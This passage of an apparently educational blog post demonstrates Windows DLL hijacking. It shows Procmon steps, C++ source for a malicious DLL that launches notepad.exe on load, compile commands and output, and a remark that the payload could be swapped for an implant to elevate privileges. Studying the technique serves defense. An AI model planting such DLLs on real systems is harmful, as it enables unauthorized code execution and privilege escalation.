+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Microsoft</span> <span class="n">Visual</span> <span class="n">Studio</span><span class="p">\</span><span class="mf">2022</span><span class="p">\</span><span class="n">Community</span><span class="p">\</span><span class="n">VC</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">MSVC</span><span class="p">\</span><span class="mf">14.31</span><span class="p">.</span><span class="mf">31103</span><span class="p">\</span><span class="n">include</span><span class="p">\</span><span class="n">ostream</span><span class="p">(</span><span class="mf">770</span><span class="p">)</span><span class="err">:</span> <span class="n">warning</span> <span class="n">C4530</span><span class="err">:</span> <span class="n">C</span><span class="p">++</span> <span class="n">exception</span> <span class="n">handler</span> <span class="n">used</span><span class="p">,</span> <span class="n">but</span> <span class="n">unwind</span> <span class="n">semantics</span> <span class="n">are</span> <span class="n">not</span> <span class="n">enabled</span><span class="p">.</span> <span class="n">Specify</span> <span class="p">/</span><span class="n">EHsc</span>
+</span></span><span class="line"><span class="cl"><span class="n">unknown</span><span class="p">.</span><span class="py">cpp</span><span class="p">(</span><span class="mf">5</span><span class="p">)</span><span class="err">:</span> <span class="n">note</span><span class="err">:</span> <span class="n">see</span> <span class="n">reference</span> <span class="n">to</span> <span class="kd">function</span><span class="w"> </span><span class="nb">template</span> <span class="n">instantiation</span> <span class="s1">&#39;std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt; &amp;std::operator &lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt; &amp;,const char *)&#39;</span> <span class="n">being</span> <span class="n">compiled</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="p">(</span><span class="n">R</span><span class="p">)</span> <span class="n">Incremental</span> <span class="n">Linker</span> <span class="n">Version</span> <span class="mf">14.31</span><span class="p">.</span><span class="py">31104</span><span class="p">.</span><span class="py">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span>  <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">out</span><span class="err">:</span><span class="n">unknown</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">DLL</span>
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">OUT</span><span class="err">:</span><span class="n">unknown</span><span class="p">.</span><span class="py">dll</span>
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">def</span><span class="err">:</span><span class="n">unknown</span><span class="p">.</span><span class="py">def</span>
+</span></span><span class="line"><span class="cl"><span class="n">unknown</span><span class="p">.</span><span class="py">obj</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Creating</span> <span class="n">library</span> <span class="n">unknown</span><span class="p">.</span><span class="py">lib</span> <span class="n">and</span> <span class="n">object</span> <span class="n">unknown</span><span class="p">.</span><span class="py">exp</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we have to copy the DLL into the directory of the executable:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">&gt;</span><span class="nb">copy </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">dll-hijack</span><span class="p">\</span><span class="nb">dll-hijack</span><span class="p">\</span><span class="n">unknown</span><span class="p">.</span><span class="py">dll</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">dll-hijack</span><span class="p">\</span><span class="nb">dll-hijack</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Release</span><span class="p">\</span>
+</span></span><span class="line"><span class="cl">        <span class="mf">1</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">copied</span><span class="p">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we&rsquo;re going to add the following procmon filter to filter the executable:</p>
+<figure><a class="lightgallery" href="/images/posts/procmon-dll-hijack-filter.png" title="/images/posts/procmon-dll-hijack-filter.png" data-thumbnail="/images/posts/procmon-dll-hijack-filter.png" data-sub-html="<h2>Procmon DLL Hijack Filter</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/procmon-dll-hijack-filter.png"
+            data-srcset="/images/posts/procmon-dll-hijack-filter.png, /images/posts/procmon-dll-hijack-filter.png 1.5x, /images/posts/procmon-dll-hijack-filter.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/procmon-dll-hijack-filter.png" />
+    </a><figcaption class="image-caption">Procmon DLL Hijack Filter</figcaption>
+    </figure>
+<p>Now we&rsquo;ll filter the DLL:</p>
+<figure><a class="lightgallery" href="/images/posts/procmon-dll-hijack-filter-dll.png" title="/images/posts/procmon-dll-hijack-filter-dll.png" data-thumbnail="/images/posts/procmon-dll-hijack-filter-dll.png" data-sub-html="<h2>Procmon DLL Hijack</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/procmon-dll-hijack-filter-dll.png"
+            data-srcset="/images/posts/procmon-dll-hijack-filter-dll.png, /images/posts/procmon-dll-hijack-filter-dll.png 1.5x, /images/posts/procmon-dll-hijack-filter-dll.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/procmon-dll-hijack-filter-dll.png" />
+    </a><figcaption class="image-caption">Procmon DLL Hijack</figcaption>
+    </figure>
+<p>Finally, we&rsquo;ll add the <code>NAME NOT FOUND</code> string:</p>
+<figure><a class="lightgallery" href="/images/posts/procmon-dll-hijack-filter-string.png" title="/images/posts/procmon-dll-hijack-filter-string.png" data-thumbnail="/images/posts/procmon-dll-hijack-filter-string.png" data-sub-html="<h2>Procmon DLL Hijack Filter String</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/procmon-dll-hijack-filter-string.png"
+            data-srcset="/images/posts/procmon-dll-hijack-filter-string.png, /images/posts/procmon-dll-hijack-filter-string.png 1.5x, /images/posts/procmon-dll-hijack-filter-string.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/procmon-dll-hijack-filter-string.png" />
+    </a><figcaption class="image-caption">Procmon DLL Hijack Filter String</figcaption>
+    </figure>
+<p>Hit the capture button (Ctrl+E) to start monitoring:</p>
+<figure><a class="lightgallery" href="/images/posts/procmon-capture.png" title="/images/posts/procmon-capture.png" data-thumbnail="/images/posts/procmon-capture.png" data-sub-html="<h2>Procmon Capture</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/procmon-capture.png"
+            data-srcset="/images/posts/procmon-capture.png, /images/posts/procmon-capture.png 1.5x, /images/posts/procmon-capture.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/procmon-capture.png" />
+    </a><figcaption class="image-caption">Procmon Capture</figcaption>
+    </figure>
+<p>Execute the executable:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Release</span><span class="p">&gt;.\</span><span class="nb">DLL-Hijack</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">Hola</span> <span class="n">Mundo</span><span class="p">!</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In the output we can see the DLL that the DLL file was found:</p>
+<figure><a class="lightgallery" href="/images/posts/dll-found.png" title="/images/posts/dll-found.png" data-thumbnail="/images/posts/dll-found.png" data-sub-html="<h2>DLL Found</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/dll-found.png"
+            data-srcset="/images/posts/dll-found.png, /images/posts/dll-found.png 1.5x, /images/posts/dll-found.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/dll-found.png" />
+    </a><figcaption class="image-caption">DLL Found</figcaption>
+    </figure>
+<p>However, if we delete or rename the DLL file in our directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Release</span><span class="p">&gt;</span><span class="nb">del </span><span class="n">unknown</span><span class="p">.</span><span class="py">dll</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we execute our executable again while this time enabling the <strong>name not found</strong> and the capture button in <code>procmon</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Release</span><span class="p">&gt;.\</span><span class="nb">DLL-Hijack</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Unhandled</span> <span class="n">Exception</span><span class="err">:</span> <span class="n">System</span><span class="p">.</span><span class="n">DllNotFoundException</span><span class="err">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">load</span> <span class="n">DLL</span> <span class="s1">&#39;unknown.dll&#39;</span><span class="err">:</span> <span class="n">The</span> <span class="n">specified</span> <span class="n">module</span> <span class="n">could</span> <span class="n">not</span> <span class="n">be</span> <span class="n">found</span><span class="p">.</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">from</span> <span class="n">HRESULT</span><span class="err">:</span> <span class="n">0x8007007E</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">at</span> <span class="n">dll_hijack</span><span class="p">.</span><span class="py">UnknownMethod</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">   <span class="n">at</span> <span class="n">dll_hijack</span><span class="p">.</span><span class="py">Main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="k">in</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">\</span><span class="nb">DLl-Hijack</span><span class="p">.</span><span class="n">cs</span><span class="err">:</span><span class="n">line</span> <span class="mf">7</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can already see that the DLL file was not found based on the output above, if we take a look at procmon, we can see the DLL search order:</p>
+<figure><a class="lightgallery" href="/images/posts/procmon-dll-hijack-name-not-found.png" title="/images/posts/procmon-dll-hijack-name-not-found.png" data-thumbnail="/images/posts/procmon-dll-hijack-name-not-found.png" data-sub-html="<h2>Procmon DLL Hijack</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/procmon-dll-hijack-name-not-found.png"
+            data-srcset="/images/posts/procmon-dll-hijack-name-not-found.png, /images/posts/procmon-dll-hijack-name-not-found.png 1.5x, /images/posts/procmon-dll-hijack-name-not-found.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/procmon-dll-hijack-name-not-found.png" />
+    </a><figcaption class="image-caption">Procmon DLL Hijack</figcaption>
+    </figure>
+<blockquote>
+<p>Note: The Procmon operations order is from OLD on top and NEW on bottom. We can see this in the <strong>Time of Day</strong> column.</p>
+</blockquote>
+<p>On our Visual Studio project we&rsquo;ll add our evil DLL payload file named <code>unknown-evil.cpp</code> which will spawn <code>notepad.exe</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;tchar.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Needs to be DllMain
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// std::cout &lt;&lt; &#34;Launching notepad.exe!&#34; &lt;&lt; std::endl;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// char cmd[] = &#34;C:\\Windows\\System32\\cmd.exe&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">LPCWSTR</span> <span class="n">cmd</span> <span class="o">=</span> <span class="sa">L</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">system32</span><span class="se">\\</span><span class="s">notepad.exe&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// WinExec(cmd, SW_SHOW); 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">CreateProcess</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">cmd</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">extern</span> <span class="s">&#34;C&#34;</span> <span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">UnknownMethod</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;DLL Hijacked!&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We&rsquo;ll compile this code into a DLL and copy the same to the application directory, this technique is known as <strong>DLL Sideloading</strong> since we&rsquo;re writing a DLL in the application&rsquo;s folder and not in the <strong>%PATH%</strong> environment variable:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">&gt;</span><span class="n">cl</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">W0</span> <span class="p">/</span><span class="n">DUNICODE</span> <span class="p">/</span><span class="n">D_UNICODE</span> <span class="p">/</span><span class="n">D_USRDLL</span> <span class="p">/</span><span class="n">D_WINDLL</span> <span class="nb">unknown-evil</span><span class="p">.</span><span class="nb">cpp </span><span class="n">unknown</span><span class="p">.</span><span class="py">def</span> <span class="p">/</span><span class="n">MT</span> <span class="p">/</span><span class="n">link</span> <span class="p">/</span><span class="n">DLL</span> <span class="p">/</span><span class="n">OUT</span><span class="err">:</span><span class="n">unknown</span><span class="p">.</span><span class="py">dll</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="p">(</span><span class="n">R</span><span class="p">)</span> <span class="n">C</span><span class="p">/</span><span class="n">C</span><span class="p">++</span> <span class="n">Optimizing</span> <span class="n">Compiler</span> <span class="n">Version</span> <span class="mf">19.31</span><span class="p">.</span><span class="py">31104</span> <span class="k">for</span> <span class="n">x86</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span>  <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">unknown-evil</span><span class="p">.</span><span class="nb">cpp
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Microsoft</span> <span class="n">Visual</span> <span class="n">Studio</span><span class="p">\</span><span class="mf">2022</span><span class="p">\</span><span class="n">Community</span><span class="p">\</span><span class="n">VC</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">MSVC</span><span class="p">\</span><span class="mf">14.31</span><span class="p">.</span><span class="mf">31103</span><span class="p">\</span><span class="n">include</span><span class="p">\</span><span class="n">ostream</span><span class="p">(</span><span class="mf">770</span><span class="p">)</span><span class="err">:</span> <span class="n">warning</span> <span class="n">C4530</span><span class="err">:</span> <span class="n">C</span><span class="p">++</span> <span class="n">exception</span> <span class="n">handler</span> <span class="n">used</span><span class="p">,</span> <span class="n">but</span> <span class="n">unwind</span> <span class="n">semantics</span> <span class="n">are</span> <span class="n">not</span> <span class="n">enabled</span><span class="p">.</span> <span class="n">Specify</span> <span class="p">/</span><span class="n">EHsc</span>
+</span></span><span class="line"><span class="cl"><span class="nb">unknown-evil</span><span class="p">.</span><span class="py">cpp</span><span class="p">(</span><span class="mf">35</span><span class="p">)</span><span class="err">:</span> <span class="n">note</span><span class="err">:</span> <span class="n">see</span> <span class="n">reference</span> <span class="n">to</span> <span class="kd">function</span><span class="w"> </span><span class="nb">template</span> <span class="n">instantiation</span> <span class="s1">&#39;std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt; &amp;std::operator &lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt; &amp;,const char *)&#39;</span> <span class="n">being</span> <span class="n">compiled</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="p">(</span><span class="n">R</span><span class="p">)</span> <span class="n">Incremental</span> <span class="n">Linker</span> <span class="n">Version</span> <span class="mf">14.31</span><span class="p">.</span><span class="py">31104</span><span class="p">.</span><span class="py">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span>  <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">out</span><span class="err">:</span><span class="nb">unknown-evil</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">DLL</span>
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">OUT</span><span class="err">:</span><span class="n">unknown</span><span class="p">.</span><span class="py">dll</span>
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">def</span><span class="err">:</span><span class="n">unknown</span><span class="p">.</span><span class="py">def</span>
+</span></span><span class="line"><span class="cl"><span class="nb">unknown-evil</span><span class="p">.</span><span class="py">obj</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Creating</span> <span class="n">library</span> <span class="n">unknown</span><span class="p">.</span><span class="py">lib</span> <span class="n">and</span> <span class="n">object</span> <span class="n">unknown</span><span class="p">.</span><span class="py">exp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">&gt;</span><span class="nb">copy </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">dll-hijack</span><span class="p">\</span><span class="nb">dll-hijack</span><span class="p">\</span><span class="n">unknown</span><span class="p">.</span><span class="py">dll</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">dll-hijack</span><span class="p">\</span><span class="nb">dll-hijack</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Release</span><span class="p">\</span>
+</span></span><span class="line"><span class="cl">        <span class="mf">1</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">copied</span><span class="p">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s open a command prompt or a PowerShell console as an <strong>administrator</strong>. When we run the executable the DLL will be loaded and the exported functions will be executed:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">Project1</span><span class="p">\</span><span class="n">Project1</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Release</span><span class="p">&gt;.\</span><span class="n">Project1</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">DLL</span> <span class="n">Hijacked</span><span class="p">!</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As we can see the application <code>notepad.exe</code> was launched:</p>
+<figure><a class="lightgallery" href="/images/posts/dll-hijacked.png" title="/images/posts/dll-hijacked.png" data-thumbnail="/images/posts/dll-hijacked.png" data-sub-html="<h2>DLL Hijacked</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/dll-hijacked.png"
+            data-srcset="/images/posts/dll-hijacked.png, /images/posts/dll-hijacked.png 1.5x, /images/posts/dll-hijacked.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/dll-hijacked.png" />
+    </a><figcaption class="image-caption">DLL Hijacked</figcaption>
+    </figure>
+<p>Using Process Hacker as <strong>administrator</strong> we can view the access token:</p>
+<figure><a class="lightgallery" href="/images/posts/process-hacker-dll-hijack.png" title="/images/posts/process-hacker-dll-hijack.png" data-thumbnail="/images/posts/process-hacker-dll-hijack.png" data-sub-html="<h2>Process Hacker DLL Hijack</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/process-hacker-dll-hijack.png"
+            data-srcset="/images/posts/process-hacker-dll-hijack.png, /images/posts/process-hacker-dll-hijack.png 1.5x, /images/posts/process-hacker-dll-hijack.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/process-hacker-dll-hijack.png" />
+    </a><figcaption class="image-caption">Process Hacker DLL Hijack</figcaption>
+    </figure>
+<p>Noticed that is running with a high-integrity level since the executable was executed from a high-integrity level console. This created a process tree which by default the child process (notepad.exe) inherits the access token of the parent process (DLL-Hijack.exe).</p>
+<p>Now we could also try to write to one of the directories in the <strong>%PATH%</strong> environment variable to implement a <strong>DLL PATH Hijacking</strong> technique. We can replace <code>notepad.exe</code> with our <code>implant</code> or <code>payload</code> to elevate our privileges.</p>
+<h2 id="defense">Defense</h2>
+<p>DLL hijacking is an exploitation technique used to achieve code execution within the context of an application or service integrity level. To mitigate this risk, it is essential to address vulnerabilities such as misconfigured folder permissions or the abuse of privileged file operations:</p>
+<ul>
+<li>
